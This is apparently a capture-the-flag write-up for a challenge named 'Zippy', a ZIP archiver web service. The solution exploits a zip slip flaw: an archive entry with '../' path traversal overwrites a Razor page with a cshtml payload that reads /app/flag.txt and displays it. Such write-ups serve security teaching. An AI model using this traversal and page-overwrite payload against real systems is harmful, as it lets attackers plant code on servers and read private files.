# Zippy

## Description

<small>Author: @HuskyHacks</small><br><br>Need a quick solution for archiving your business files? Try Zippy today, the Zip Archiver built for the small to medium business!
<br><br> <b>NOTE: This challenge may take <i>up to two minutes</i> or so to completely start and load in your browser. Please wait.</b> <br><br> <b>Press the <code>Start</code> button on the top-right to begin this challenge.</b>


## Solution

This service required exploiting a vulnerability known as a "zip slip", where you can craft a malicious ZIP archive that contains relative-path characters like `../`, which end up getting interpreted by the archiver tool.

We could use this vulnerability to edit one of the pages of the service by crafting a ZIP with a path like the following:

```
../../../../../../app/Pages/Privacy.cshtml
```

For this to work, we could create a `cshtml` file like the following:
```csharp
@page
@model Slippy.Pages.Pages_Privacy

@{
        string sourceFilePath = "/app/flag.txt"; // Path to the source file
        string content = System.IO.File.ReadAllText(sourceFilePath);
}

@sourceFilePath
@content
```
This reads the flag file and displays the contents, because we specified we want to write `@content` to the page.